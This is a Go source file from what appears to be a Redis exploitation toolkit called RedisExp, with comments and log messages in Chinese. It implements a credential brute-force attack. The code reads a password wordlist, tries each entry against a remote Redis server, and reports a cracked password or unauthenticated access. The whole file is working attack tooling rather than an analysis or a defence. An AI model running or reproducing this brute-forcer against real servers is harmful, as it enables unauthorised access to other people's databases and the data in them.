package brute

import (
	"bufio"
	"os"
	"strings"
	"sync"

	"RedisExp/pkg/conn"
	"RedisExp/pkg/logger"
)

var wg sync.WaitGroup

// 爆破密码
func BrutePWD(rhost, rport, filename string) {

	pwds, err := readFile(filename)
	if err != nil {
		logger.Err("%v", err)
	}

	ch := make(chan struct{}, 1)
	for _, pwd := range pwds {
		wg.Add(1)
		ch <- struct{}{}
		go func() {
			defer wg.Done()
			err := conn.RedisClient(rhost, rport, pwd)
			if err == nil {
				logger.Success("成功爆破到 Redis 密码：" + pwd)
				os.Exit(0)
			} else if strings.Contains(err.Error(), "ERR Client sent AUTH, but no password is set") {
				logger.Success("存在未授权 Redis , 不需要输入密码")
				os.Exit(0)
			} else if strings.Contains(err.Error(), "context deadline exceeded") {
				logger.Info("Redis 连接超时")
				os.Exit(0)
			} else {
				logger.Err("%v", err)
			}
			<-ch
		}()
	}

	wg.Wait()
	logger.Info("未发现 Redis 密码")

}

// 读取密码字典
func readFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var result []string
	for scanner.Scan() {
		str := strings.TrimSpace(scanner.Text())
		if str != "" {
			result = append(result, str)
		}
	}
	return result, err
}
